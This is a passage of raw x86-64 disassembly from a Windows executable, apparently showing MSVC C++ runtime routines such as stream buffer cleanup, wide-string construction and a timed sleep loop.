   1400058b2:	48 83 ec 20          	sub    $0x20,%rsp
   1400058b6:	48 8b d9             	mov    %rcx,%rbx
   1400058b9:	48 8d 05 b8 37 00 00 	lea    0x37b8(%rip),%rax        # 0x140009078
   1400058c0:	48 89 01             	mov    %rax,(%rcx)
   1400058c3:	48 83 b9 80 00 00 00 	cmpq   $0x0,0x80(%rcx)
   1400058ca:	00 
   1400058cb:	74 2f                	je     0x1400058fc
   1400058cd:	48 8b 49 18          	mov    0x18(%rcx),%rcx
   1400058d1:	48 8d 43 70          	lea    0x70(%rbx),%rax
   1400058d5:	48 39 01             	cmp    %rax,(%rcx)
   1400058d8:	75 22                	jne    0x1400058fc
   1400058da:	4c 8b 83 90 00 00 00 	mov    0x90(%rbx),%r8
   1400058e1:	48 8b 93 88 00 00 00 	mov    0x88(%rbx),%rdx
   1400058e8:	48 89 11             	mov    %rdx,(%rcx)
   1400058eb:	48 8b 43 38          	mov    0x38(%rbx),%rax
   1400058ef:	48 89 10             	mov    %rdx,(%rax)
   1400058f2:	44 2b c2             	sub    %edx,%r8d
   1400058f5:	48 8b 43 50          	mov    0x50(%rbx),%rax
   1400058f9:	44 89 00             	mov    %r8d,(%rax)
   1400058fc:	80 7b 7c 00          	cmpb   $0x0,0x7c(%rbx)
   140005900:	74 08                	je     0x14000590a
   140005902:	48 8b cb             	mov    %rbx,%rcx
   140005905:	e8 56 06 00 00       	call   0x140005f60
   14000590a:	48 8b cb             	mov    %rbx,%rcx
   14000590d:	48 83 c4 20          	add    $0x20,%rsp
   140005911:	5b                   	pop    %rbx
   140005912:	48 ff 25 97 28 00 00 	rex.W jmp *0x2897(%rip)        # 0x1400081b0
   140005919:	cc                   	int3
   14000591a:	cc                   	int3
   14000591b:	cc                   	int3
   14000591c:	cc                   	int3
   14000591d:	cc                   	int3
   14000591e:	cc                   	int3
   14000591f:	cc                   	int3
   140005920:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140005925:	57                   	push   %rdi
   140005926:	48 83 ec 20          	sub    $0x20,%rsp
   14000592a:	48 8d b9 58 ff ff ff 	lea    -0xa8(%rcx),%rdi
   140005931:	8b da                	mov    %edx,%ebx
   140005933:	48 8b cf             	mov    %rdi,%rcx
   140005936:	e8 d5 dc ff ff       	call   0x140003610
   14000593b:	f6 c3 01             	test   $0x1,%bl
   14000593e:	74 0d                	je     0x14000594d
   140005940:	ba 08 01 00 00       	mov    $0x108,%edx
   140005945:	48 8b cf             	mov    %rdi,%rcx
   140005948:	e8 53 10 00 00       	call   0x1400069a0
   14000594d:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140005952:	48 8b c7             	mov    %rdi,%rax
   140005955:	48 83 c4 20          	add    $0x20,%rsp
   140005959:	5f                   	pop    %rdi
   14000595a:	c3                   	ret
   14000595b:	cc                   	int3
   14000595c:	cc                   	int3
   14000595d:	cc                   	int3
   14000595e:	cc                   	int3
   14000595f:	cc                   	int3
   140005960:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140005965:	57                   	push   %rdi
   140005966:	48 83 ec 20          	sub    $0x20,%rsp
   14000596a:	8b fa                	mov    %edx,%edi
   14000596c:	48 8b d9             	mov    %rcx,%rbx
   14000596f:	48 8d 05 02 37 00 00 	lea    0x3702(%rip),%rax        # 0x140009078
   140005976:	48 89 01             	mov    %rax,(%rcx)
   140005979:	48 83 b9 80 00 00 00 	cmpq   $0x0,0x80(%rcx)
   140005980:	00 
   140005981:	74 2d                	je     0x1400059b0
   140005983:	4c 8b 41 18          	mov    0x18(%rcx),%r8
   140005987:	48 8d 41 70          	lea    0x70(%rcx),%rax
   14000598b:	49 39 00             	cmp    %rax,(%r8)
   14000598e:	75 20                	jne    0x1400059b0
   140005990:	48 8b 91 90 00 00 00 	mov    0x90(%rcx),%rdx
   140005997:	48 8b 89 88 00 00 00 	mov    0x88(%rcx),%rcx
   14000599e:	49 89 08             	mov    %rcx,(%r8)
   1400059a1:	48 8b 43 38          	mov    0x38(%rbx),%rax
   1400059a5:	48 89 08             	mov    %rcx,(%rax)
   1400059a8:	2b d1                	sub    %ecx,%edx
   1400059aa:	48 8b 43 50          	mov    0x50(%rbx),%rax
   1400059ae:	89 10                	mov    %edx,(%rax)
   1400059b0:	80 7b 7c 00          	cmpb   $0x0,0x7c(%rbx)
   1400059b4:	74 08                	je     0x1400059be
   1400059b6:	48 8b cb             	mov    %rbx,%rcx
   1400059b9:	e8 a2 05 00 00       	call   0x140005f60
   1400059be:	48 8b cb             	mov    %rbx,%rcx
   1400059c1:	ff 15 e9 27 00 00    	call   *0x27e9(%rip)        # 0x1400081b0
   1400059c7:	90                   	nop
   1400059c8:	40 f6 c7 01          	test   $0x1,%dil
   1400059cc:	74 0d                	je     0x1400059db
   1400059ce:	ba 98 00 00 00       	mov    $0x98,%edx
   1400059d3:	48 8b cb             	mov    %rbx,%rcx
   1400059d6:	e8 c5 0f 00 00       	call   0x1400069a0
   1400059db:	48 8b c3             	mov    %rbx,%rax
   1400059de:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400059e3:	48 83 c4 20          	add    $0x20,%rsp
   1400059e7:	5f                   	pop    %rdi
   1400059e8:	c3                   	ret
   1400059e9:	cc                   	int3
   1400059ea:	cc                   	int3
   1400059eb:	cc                   	int3
   1400059ec:	cc                   	int3
   1400059ed:	cc                   	int3
   1400059ee:	cc                   	int3
   1400059ef:	cc                   	int3
   1400059f0:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   1400059f5:	55                   	push   %rbp
   1400059f6:	56                   	push   %rsi
   1400059f7:	57                   	push   %rdi
   1400059f8:	41 56                	push   %r14
   1400059fa:	41 57                	push   %r15
   1400059fc:	48 83 ec 30          	sub    $0x30,%rsp
   140005a00:	45 33 ff             	xor    %r15d,%r15d
   140005a03:	0f 57 c0             	xorps  %xmm0,%xmm0
   140005a06:	49 8b d8             	mov    %r8,%rbx
   140005a09:	4c 8b f2             	mov    %rdx,%r14
   140005a0c:	48 8b f9             	mov    %rcx,%rdi
   140005a0f:	0f 11 01             	movups %xmm0,(%rcx)
   140005a12:	4c 89 79 10          	mov    %r15,0x10(%rcx)
   140005a16:	4c 89 79 18          	mov    %r15,0x18(%rcx)
   140005a1a:	49 3b d0             	cmp    %r8,%rdx
   140005a1d:	75 11                	jne    0x140005a30
   140005a1f:	48 c7 41 18 07 00 00 	movq   $0x7,0x18(%rcx)
   140005a26:	00 
   140005a27:	66 44 89 39          	mov    %r15w,(%rcx)
   140005a2b:	e9 f6 00 00 00       	jmp    0x140005b26
   140005a30:	49 2b de             	sub    %r14,%rbx
   140005a33:	48 bd fe ff ff ff ff 	movabs $0x7ffffffffffffffe,%rbp
   140005a3a:	ff ff 7f 
   140005a3d:	48 d1 fb             	sar    $1,%rbx
   140005a40:	48 3b dd             	cmp    %rbp,%rbx
   140005a43:	0f 87 f1 00 00 00    	ja     0x140005b3a
   140005a49:	48 83 fb 07          	cmp    $0x7,%rbx
   140005a4d:	77 21                	ja     0x140005a70
   140005a4f:	48 89 59 10          	mov    %rbx,0x10(%rcx)
   140005a53:	48 03 db             	add    %rbx,%rbx
   140005a56:	4c 8b c3             	mov    %rbx,%r8
   140005a59:	48 c7 41 18 07 00 00 	movq   $0x7,0x18(%rcx)
   140005a60:	00 
   140005a61:	e8 a5 1f 00 00       	call   0x140007a0b
   140005a66:	66 44 89 3c 3b       	mov    %r15w,(%rbx,%rdi,1)
   140005a6b:	e9 b6 00 00 00       	jmp    0x140005b26
   140005a70:	48 8b c3             	mov    %rbx,%rax
   140005a73:	48 83 c8 07          	or     $0x7,%rax
   140005a77:	48 3b c5             	cmp    %rbp,%rax
   140005a7a:	76 47                	jbe    0x140005ac3
   140005a7c:	48 b8 ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rax
   140005a83:	ff ff 7f 
   140005a86:	48 8d 0c 00          	lea    (%rax,%rax,1),%rcx
   140005a8a:	48 81 f9 00 10 00 00 	cmp    $0x1000,%rcx
   140005a91:	72 6a                	jb     0x140005afd
   140005a93:	48 8d 41 27          	lea    0x27(%rcx),%rax
   140005a97:	48 3b c1             	cmp    %rcx,%rax
   140005a9a:	0f 86 a0 00 00 00    	jbe    0x140005b40
   140005aa0:	48 8b c8             	mov    %rax,%rcx
   140005aa3:	e8 00 0f 00 00       	call   0x1400069a8
   140005aa8:	48 85 c0             	test   %rax,%rax
   140005aab:	75 42                	jne    0x140005aef
   140005aad:	45 33 c9             	xor    %r9d,%r9d
   140005ab0:	4c 89 7c 24 20       	mov    %r15,0x20(%rsp)
   140005ab5:	45 33 c0             	xor    %r8d,%r8d
   140005ab8:	33 d2                	xor    %edx,%edx
   140005aba:	33 c9                	xor    %ecx,%ecx
   140005abc:	ff 15 fe 29 00 00    	call   *0x29fe(%rip)        # 0x1400084c0
   140005ac2:	cc                   	int3
   140005ac3:	b9 0a 00 00 00       	mov    $0xa,%ecx
   140005ac8:	48 8b e8             	mov    %rax,%rbp
   140005acb:	48 3b c1             	cmp    %rcx,%rax
   140005ace:	48 b8 ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rax
   140005ad5:	ff ff 7f 
   140005ad8:	48 0f 42 e9          	cmovb  %rcx,%rbp
   140005adc:	48 8d 4d 01          	lea    0x1(%rbp),%rcx
   140005ae0:	48 3b c8             	cmp    %rax,%rcx
   140005ae3:	77 5b                	ja     0x140005b40
   140005ae5:	48 03 c9             	add    %rcx,%rcx
   140005ae8:	75 a0                	jne    0x140005a8a
   140005aea:	49 8b f7             	mov    %r15,%rsi
   140005aed:	eb 16                	jmp    0x140005b05
   140005aef:	48 8d 70 27          	lea    0x27(%rax),%rsi
   140005af3:	48 83 e6 e0          	and    $0xffffffffffffffe0,%rsi
   140005af7:	48 89 46 f8          	mov    %rax,-0x8(%rsi)
   140005afb:	eb 08                	jmp    0x140005b05
   140005afd:	e8 a6 0e 00 00       	call   0x1400069a8
   140005b02:	48 8b f0             	mov    %rax,%rsi
   140005b05:	48 89 5f 10          	mov    %rbx,0x10(%rdi)
   140005b09:	49 8b d6             	mov    %r14,%rdx
   140005b0c:	48 03 db             	add    %rbx,%rbx
   140005b0f:	48 89 37             	mov    %rsi,(%rdi)
   140005b12:	4c 8b c3             	mov    %rbx,%r8
   140005b15:	48 89 6f 18          	mov    %rbp,0x18(%rdi)
   140005b19:	48 8b ce             	mov    %rsi,%rcx
   140005b1c:	e8 ea 1e 00 00       	call   0x140007a0b
   140005b21:	66 44 89 3c 33       	mov    %r15w,(%rbx,%rsi,1)
   140005b26:	48 8b 5c 24 78       	mov    0x78(%rsp),%rbx
   140005b2b:	48 8b c7             	mov    %rdi,%rax
   140005b2e:	48 83 c4 30          	add    $0x30,%rsp
   140005b32:	41 5f                	pop    %r15
   140005b34:	41 5e                	pop    %r14
   140005b36:	5f                   	pop    %rdi
   140005b37:	5e                   	pop    %rsi
   140005b38:	5d                   	pop    %rbp
   140005b39:	c3                   	ret
   140005b3a:	e8 71 b8 ff ff       	call   0x1400013b0
   140005b3f:	cc                   	int3
   140005b40:	e8 4b b7 ff ff       	call   0x140001290
   140005b45:	cc                   	int3
   140005b46:	cc                   	int3
   140005b47:	cc                   	int3
   140005b48:	cc                   	int3
   140005b49:	cc                   	int3
   140005b4a:	cc                   	int3
   140005b4b:	cc                   	int3
   140005b4c:	cc                   	int3
   140005b4d:	cc                   	int3
   140005b4e:	cc                   	int3
   140005b4f:	cc                   	int3
   140005b50:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140005b55:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   140005b5a:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140005b5f:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   140005b64:	41 56                	push   %r14
   140005b66:	48 83 ec 20          	sub    $0x20,%rsp
   140005b6a:	48 8b f9             	mov    %rcx,%rdi
   140005b6d:	48 be 00 00 4f 91 94 	movabs $0x4e94914f0000,%rsi
   140005b74:	4e 00 00 
   140005b77:	48 bd db 34 b6 d7 82 	movabs $0x431bde82d7b634db,%rbp
   140005b7e:	de 1b 43 
   140005b81:	49 be f3 8c 90 94 07 	movabs $0xb2f4fc0794908cf3,%r14
   140005b88:	fc f4 b2 
   140005b8b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140005b90:	ff 15 42 26 00 00    	call   *0x2642(%rip)        # 0x1400081d8
   140005b96:	48 8b d8             	mov    %rax,%rbx
   140005b99:	ff 15 91 26 00 00    	call   *0x2691(%rip)        # 0x140008230
   140005b9f:	48 8b c8             	mov    %rax,%rcx
   140005ba2:	48 81 fb 80 96 98 00 	cmp    $0x989680,%rbx
   140005ba9:	75 06                	jne    0x140005bb1
   140005bab:	48 6b c1 64          	imul   $0x64,%rcx,%rax
   140005baf:	eb 71                	jmp    0x140005c22
   140005bb1:	48 81 fb 00 36 6e 01 	cmp    $0x16e3600,%rbx
   140005bb8:	75 4a                	jne    0x140005c04
   140005bba:	49 8b c6             	mov    %r14,%rax
   140005bbd:	48 f7 e9             	imul   %rcx
   140005bc0:	4c 8d 04 11          	lea    (%rcx,%rdx,1),%r8
   140005bc4:	49 c1 f8 18          	sar    $0x18,%r8
   140005bc8:	49 8b c0             	mov    %r8,%rax
   140005bcb:	48 c1 e8 3f          	shr    $0x3f,%rax
   140005bcf:	4c 03 c0             	add    %rax,%r8
   140005bd2:	49 69 c0 00 36 6e 01 	imul   $0x16e3600,%r8,%rax
   140005bd9:	48 2b c8             	sub    %rax,%rcx
   140005bdc:	49 8b c6             	mov    %r14,%rax
   140005bdf:	48 69 c9 00 ca 9a 3b 	imul   $0x3b9aca00,%rcx,%rcx
   140005be6:	48 f7 e9             	imul   %rcx
   140005be9:	48 8d 04 11          	lea    (%rcx,%rdx,1),%rax
   140005bed:	48 c1 f8 18          	sar    $0x18,%rax
   140005bf1:	48 8b c8             	mov    %rax,%rcx
   140005bf4:	48 c1 e9 3f          	shr    $0x3f,%rcx
   140005bf8:	48 03 c1             	add    %rcx,%rax
   140005bfb:	49 69 c8 00 ca 9a 3b 	imul   $0x3b9aca00,%r8,%rcx
   140005c02:	eb 1b                	jmp    0x140005c1f
   140005c04:	48 99                	cqto
   140005c06:	48 f7 fb             	idiv   %rbx
   140005c09:	48 8b c8             	mov    %rax,%rcx
   140005c0c:	48 69 c2 00 ca 9a 3b 	imul   $0x3b9aca00,%rdx,%rax
   140005c13:	48 99                	cqto
   140005c15:	48 f7 fb             	idiv   %rbx
   140005c18:	48 69 c9 00 ca 9a 3b 	imul   $0x3b9aca00,%rcx,%rcx
   140005c1f:	48 03 c1             	add    %rcx,%rax
   140005c22:	48 8b 0f             	mov    (%rdi),%rcx
   140005c25:	48 3b c1             	cmp    %rcx,%rax
   140005c28:	7d 47                	jge    0x140005c71
   140005c2a:	48 2b c8             	sub    %rax,%rcx
   140005c2d:	48 3b ce             	cmp    %rsi,%rcx
   140005c30:	7e 11                	jle    0x140005c43
   140005c32:	ba 00 5c 26 05       	mov    $0x5265c00,%edx
   140005c37:	8b ca                	mov    %edx,%ecx
   140005c39:	e8 86 0b 00 00       	call   0x1400067c4
   140005c3e:	e9 4d ff ff ff       	jmp    0x140005b90
   140005c43:	48 8b c5             	mov    %rbp,%rax
   140005c46:	48 f7 e9             	imul   %rcx
   140005c49:	48 c1 fa 12          	sar    $0x12,%rdx
   140005c4d:	48 8b c2             	mov    %rdx,%rax
   140005c50:	48 c1 e8 3f          	shr    $0x3f,%rax
   140005c54:	48 03 d0             	add    %rax,%rdx
   140005c57:	48 69 c2 40 42 0f 00 	imul   $0xf4240,%rdx,%rax
   140005c5e:	48 3b c1             	cmp    %rcx,%rax
   140005c61:	7d 02                	jge    0x140005c65
   140005c63:	ff c2                	inc    %edx
   140005c65:	8b ca                	mov    %edx,%ecx
   140005c67:	e8 58 0b 00 00       	call   0x1400067c4
   140005c6c:	e9 1f ff ff ff       	jmp    0x140005b90
   140005c71:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140005c76:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   140005c7b:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   140005c80:	48 8b 7c 24 48       	mov    0x48(%rsp),%rdi
   140005c85:	48 83 c4 20          	add    $0x20,%rsp
   140005c89:	41 5e                	pop    %r14
   140005c8b:	c3                   	ret
   140005c8c:	cc                   	int3
   140005c8d:	cc                   	int3
   140005c8e:	cc                   	int3
   140005c8f:	cc                   	int3
   140005c90:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140005c95:	48 89 6c 24 18       	mov    %rbp,0x18(%rsp)
   140005c9a:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   140005c9f:	57                   	push   %rdi
   140005ca0:	48 83 ec 40          	sub    $0x40,%rsp
   140005ca4:	48 8b 05 95 73 00 00 	mov    0x7395(%rip),%rax        # 0x14000d040
   140005cab:	48 33 c4             	xor    %rsp,%rax
   140005cae:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   140005cb3:	48 8b e9             	mov    %rcx,%rbp
   140005cb6:	33 d2                	xor    %edx,%edx
   140005cb8:	48 8d 4c 24 28       	lea    0x28(%rsp),%rcx
   140005cbd:	ff 15 25 25 00 00    	call   *0x2525(%rip)        # 0x1400081e8
   140005cc3:	90                   	nop
   140005cc4:	48 8b 05 ad 7c 00 00 	mov    0x7cad(%rip),%rax        # 0x14000d978
   140005ccb:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140005cd0:	48 8b 1d 31 25 00 00 	mov    0x2531(%rip),%rbx        # 0x140008208
   140005cd7:	48 83 3b 00          	cmpq   $0x0,(%rbx)
   140005cdb:	75 2d                	jne    0x140005d0a
   140005cdd:	33 d2                	xor    %edx,%edx
   140005cdf:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140005ce4:	ff 15 fe 24 00 00    	call   *0x24fe(%rip)        # 0x1400081e8
   140005cea:	48 83 3b 00          	cmpq   $0x0,(%rbx)
   140005cee:	75 0f                	jne    0x140005cff
   140005cf0:	48 8b 05 09 25 00 00 	mov    0x2509(%rip),%rax        # 0x140008200
   140005cf7:	ff 00                	incl   (%rax)
   140005cf9:	48 63 00             	movslq (%rax),%rax
   140005cfc:	48 89 03             	mov    %rax,(%rbx)
   140005cff:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140005d04:	ff 15 d6 24 00 00    	call   *0x24d6(%rip)        # 0x1400081e0
   140005d0a:	48 8b 33             	mov    (%rbx),%rsi
   140005d0d:	48 8b 4d 08          	mov    0x8(%rbp),%rcx
   140005d11:	48 8d 3c f5 00 00 00 	lea    0x0(,%rsi,8),%rdi
   140005d18:	00 
   140005d19:	48 3b 71 18          	cmp    0x18(%rcx),%rsi
   140005d1d:	73 0f                	jae    0x140005d2e
   140005d1f:	48 8b 41 10          	mov    0x10(%rcx),%rax
   140005d23:	48 8b 1c 07          	mov    (%rdi,%rax,1),%rbx
   140005d27:	48 85 db             	test   %rbx,%rbx
   140005d2a:	75 68                	jne    0x140005d94
   140005d2c:	eb 02                	jmp    0x140005d30
   140005d2e:	33 db                	xor    %ebx,%ebx
   140005d30:	80 79 24 00          	cmpb   $0x0,0x24(%rcx)
   140005d34:	74 14                	je     0x140005d4a
   140005d36:	ff 15 bc 24 00 00    	call   *0x24bc(%rip)        # 0x1400081f8
   140005d3c:	48 3b 70 18          	cmp    0x18(%rax),%rsi
   140005d40:	73 0d                	jae    0x140005d4f
   140005d42:	48 8b 40 10          	mov    0x10(%rax),%rax
   140005d46:	48 8b 1c 07          	mov    (%rdi,%rax,1),%rbx
   140005d4a:	48 85 db             	test   %rbx,%rbx
   140005d4d:	75 45                	jne    0x140005d94
   140005d4f:	48 8b 5c 24 20       	mov    0x20(%rsp),%rbx
   140005d54:	48 85 db             	test   %rbx,%rbx
   140005d57:	75 3b                	jne    0x140005d94
   140005d59:	48 8b d5             	mov    %rbp,%rdx
   140005d5c:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140005d61:	ff 15 f1 24 00 00    	call   *0x24f1(%rip)        # 0x140008258
   140005d67:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   140005d6b:	74 57                	je     0x140005dc4
   140005d6d:	48 8b 5c 24 20       	mov    0x20(%rsp),%rbx
   140005d72:	48 89 5c 24 30       	mov    %rbx,0x30(%rsp)
   140005d77:	48 8b cb             	mov    %rbx,%rcx
   140005d7a:	e8 05 0a 00 00       	call   0x140006784
   140005d7f:	48 8b 03             	mov    (%rbx),%rax
   140005d82:	48 8b cb             	mov    %rbx,%rcx
   140005d85:	ff 50 08             	call   *0x8(%rax)
   140005d88:	48 8b 5c 24 20       	mov    0x20(%rsp),%rbx
   140005d8d:	48 89 1d e4 7b 00 00 	mov    %rbx,0x7be4(%rip)        # 0x14000d978
   140005d94:	48 8d 4c 24 28       	lea    0x28(%rsp),%rcx
   140005d99:	ff 15 41 24 00 00    	call   *0x2441(%rip)        # 0x1400081e0
   140005d9f:	48 8b c3             	mov    %rbx,%rax
   140005da2:	48 8b 4c 24 38       	mov    0x38(%rsp),%rcx
   140005da7:	48 33 cc             	xor    %rsp,%rcx
   140005daa:	e8 d1 0b 00 00       	call   0x140006980
   140005daf:	48 8b 5c 24 58       	mov    0x58(%rsp),%rbx
   140005db4:	48 8b 6c 24 60       	mov    0x60(%rsp),%rbp
   140005db9:	48 8b 74 24 68       	mov    0x68(%rsp),%rsi
   140005dbe:	48 83 c4 40          	add    $0x40,%rsp
   140005dc2:	5f                   	pop    %rdi
   140005dc3:	c3                   	ret
   140005dc4:	e8 67 b4 ff ff       	call   0x140001230
   140005dc9:	90                   	nop
   140005dca:	cc                   	int3
   140005dcb:	cc                   	int3
   140005dcc:	cc                   	int3
   140005dcd:	cc                   	int3
   140005dce:	cc                   	int3
   140005dcf:	cc                   	int3
   140005dd0:	40 53                	rex push %rbx
   140005dd2:	48 83 ec 30          	sub    $0x30,%rsp
   140005dd6:	48 8b d9             	mov    %rcx,%rbx
   140005dd9:	48 8b 09             	mov    (%rcx),%rcx
   140005ddc:	48 85 c9             	test   %rcx,%rcx
   140005ddf:	74 4a                	je     0x140005e2b
   140005de1:	48 8b 53 08          	mov    0x8(%rbx),%rdx
   140005de5:	e8 16 04 00 00       	call   0x140006200
   140005dea:	48 8b 0b             	mov    (%rbx),%rcx
   140005ded:	48 8b 53 10          	mov    0x10(%rbx),%rdx
   140005df1:	48 2b d1             	sub    %rcx,%rdx
   140005df4:	48 83 e2 e0          	and    $0xffffffffffffffe0,%rdx
   140005df8:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140005dff:	72 18                	jb     0x140005e19
   140005e01:	48 8b 41 f8          	mov    -0x8(%rcx),%rax
   140005e05:	48 83 c2 27          	add    $0x27,%rdx
   140005e09:	48 2b c8             	sub    %rax,%rcx
   140005e0c:	48 83 e9 08          	sub    $0x8,%rcx
   140005e10:	48 83 f9 1f          	cmp    $0x1f,%rcx
   140005e14:	77 1b                	ja     0x140005e31
   140005e16:	48 8b c8             	mov    %rax,%rcx
   140005e19:	e8 82 0b 00 00       	call   0x1400069a0
   140005e1e:	33 c0                	xor    %eax,%eax
   140005e20:	48 89 03             	mov    %rax,(%rbx)
   140005e23:	48 89 43 08          	mov    %rax,0x8(%rbx)
   140005e27:	48 89 43 10          	mov    %rax,0x10(%rbx)
   140005e2b:	48 83 c4 30          	add    $0x30,%rsp
   140005e2f:	5b                   	pop    %rbx
   140005e30:	c3                   	ret
   140005e31:	33 c0                	xor    %eax,%eax
   140005e33:	45 33 c9             	xor    %r9d,%r9d
   140005e36:	45 33 c0             	xor    %r8d,%r8d
   140005e39:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140005e3e:	33 d2                	xor    %edx,%edx
   140005e40:	33 c9                	xor    %ecx,%ecx
   140005e42:	ff 15 78 26 00 00    	call   *0x2678(%rip)        # 0x1400084c0
   140005e48:	cc                   	int3
   140005e49:	cc                   	int3
   140005e4a:	cc                   	int3
   140005e4b:	cc                   	int3
   140005e4c:	cc                   	int3
   140005e4d:	cc                   	int3
   140005e4e:	cc                   	int3
   140005e4f:	cc                   	int3
   140005e50:	48 8b 09             	mov    (%rcx),%rcx
   140005e53:	48 85 c9             	test   %rcx,%rcx
   140005e56:	74 0b                	je     0x140005e63
   140005e58:	48 8b 01             	mov    (%rcx),%rax
   140005e5b:	ba 01 00 00 00       	mov    $0x1,%edx
   140005e60:	48 ff 20             	rex.W jmp *(%rax)
   140005e63:	c3                   	ret
   140005e64:	cc                   	int3
   140005e65:	cc                   	int3
   140005e66:	cc                   	int3
   140005e67:	cc                   	int3
   140005e68:	cc                   	int3
   140005e69:	cc                   	int3
   140005e6a:	cc                   	int3
   140005e6b:	cc                   	int3
   140005e6c:	cc                   	int3
   140005e6d:	cc                   	int3
   140005e6e:	cc                   	int3
   140005e6f:	cc                   	int3
   140005e70:	40 53                	rex push %rbx
   140005e72:	48 83 ec 60          	sub    $0x60,%rsp
   140005e76:	48 8b 05 c3 71 00 00 	mov    0x71c3(%rip),%rax        # 0x14000d040
   140005e7d:	48 33 c4             	xor    %rsp,%rax
   140005e80:	48 89 44 24 58       	mov    %rax,0x58(%rsp)
   140005e85:	48 83 79 68 00       	cmpq   $0x0,0x68(%rcx)
   140005e8a:	48 8b d9             	mov    %rcx,%rbx
   140005e8d:	0f 84 b0 00 00 00    	je     0x140005f43
   140005e93:	80 79 71 00          	cmpb   $0x0,0x71(%rcx)
   140005e97:	0f 84 a6 00 00 00    	je     0x140005f43
   140005e9d:	48 8b 01             	mov    (%rcx),%rax
   140005ea0:	ba ff ff ff ff       	mov    $0xffffffff,%edx
   140005ea5:	48 89 7c 24 78       	mov    %rdi,0x78(%rsp)
   140005eaa:	ff 50 18             	call   *0x18(%rax)
   140005ead:	83 f8 ff             	cmp    $0xffffffff,%eax
   140005eb0:	0f 84 89 00 00 00    	je     0x140005f3f
   140005eb6:	48 8b 4b 68          	mov    0x68(%rbx),%rcx
   140005eba:	48 8d 44 24 30       	lea    0x30(%rsp),%rax
   140005ebf:	48 8d 53 74          	lea    0x74(%rbx),%rdx
   140005ec3:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140005ec8:	4c 8d 4c 24 58       	lea    0x58(%rsp),%r9
   140005ecd:	4c 8d 44 24 38       	lea    0x38(%rsp),%r8
   140005ed2:	ff 15 78 23 00 00    	call   *0x2378(%rip)        # 0x140008250
   140005ed8:	85 c0                	test   %eax,%eax
   140005eda:	74 28                	je     0x140005f04
   140005edc:	83 e8 01             	sub    $0x1,%eax
   140005edf:	74 27                	je     0x140005f08
   140005ee1:	83 f8 02             	cmp    $0x2,%eax
   140005ee4:	75 59                	jne    0x140005f3f
   140005ee6:	c6 43 71 00          	movb   $0x0,0x71(%rbx)
   140005eea:	b0 01                	mov    $0x1,%al
   140005eec:	48 8b 7c 24 78       	mov    0x78(%rsp),%rdi
   140005ef1:	48 8b 4c 24 58       	mov    0x58(%rsp),%rcx
   140005ef6:	48 33 cc             	xor    %rsp,%rcx
   140005ef9:	e8 82 0a 00 00       	call   0x140006980
   140005efe:	48 83 c4 60          	add    $0x60,%rsp
   140005f02:	5b                   	pop    %rbx
   140005f03:	c3                   	ret
   140005f04:	c6 43 71 00          	movb   $0x0,0x71(%rbx)
   140005f08:	48 8b 7c 24 30       	mov    0x30(%rsp),%rdi
   140005f0d:	48 8d 44 24 38       	lea    0x38(%rsp),%rax
   140005f12:	48 2b f8             	sub    %rax,%rdi
   140005f15:	74 1f                	je     0x140005f36
   140005f17:	4c 8b 8b 80 00 00 00 	mov    0x80(%rbx),%r9
   140005f1e:	48 8d 4c 24 38       	lea    0x38(%rsp),%rcx
   140005f23:	4c 8b c7             	mov    %rdi,%r8
   140005f26:	ba 01 00 00 00       	mov    $0x1,%edx
   140005f2b:	ff 15 3f 26 00 00    	call   *0x263f(%rip)        # 0x140008570
   140005f31:	48 3b f8             	cmp    %rax,%rdi
   140005f34:	75 09                	jne    0x140005f3f
   140005f36:	80 7b 71 00          	cmpb   $0x0,0x71(%rbx)
   140005f3a:	0f 94 c0             	sete   %al
   140005f3d:	eb ad                	jmp    0x140005eec
   140005f3f:	32 c0                	xor    %al,%al
   140005f41:	eb a9                	jmp    0x140005eec
   140005f43:	b0 01                	mov    $0x1,%al
   140005f45:	48 8b 4c 24 58       	mov    0x58(%rsp),%rcx
   140005f4a:	48 33 cc             	xor    %rsp,%rcx
   140005f4d:	e8 2e 0a 00 00       	call   0x140006980
   140005f52:	48 83 c4 60          	add    $0x60,%rsp
   140005f56:	5b                   	pop    %rbx
   140005f57:	c3                   	ret
   140005f58:	cc                   	int3
   140005f59:	cc                   	int3
   140005f5a:	cc                   	int3
   140005f5b:	cc                   	int3
   140005f5c:	cc                   	int3
   140005f5d:	cc                   	int3
   140005f5e:	cc                   	int3
   140005f5f:	cc                   	int3
   140005f60:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140005f65:	57                   	push   %rdi
   140005f66:	48 83 ec 20          	sub    $0x20,%rsp
   140005f6a:	48 83 b9 80 00 00 00 	cmpq   $0x0,0x80(%rcx)
   140005f71:	00 
   140005f72:	48 8b f9             	mov    %rcx,%rdi
   140005f75:	74 5e                	je     0x140005fd5
   140005f77:	4c 8b 41 18          	mov    0x18(%rcx),%r8
   140005f7b:	48 8d 41 70          	lea    0x70(%rcx),%rax
   140005f7f:	48 89 5c 24 38       	mov    %rbx,0x38(%rsp)
   140005f84:	49 39 00             	cmp    %rax,(%r8)
   140005f87:	75 20                	jne    0x140005fa9
   140005f89:	48 8b 91 90 00 00 00 	mov    0x90(%rcx),%rdx
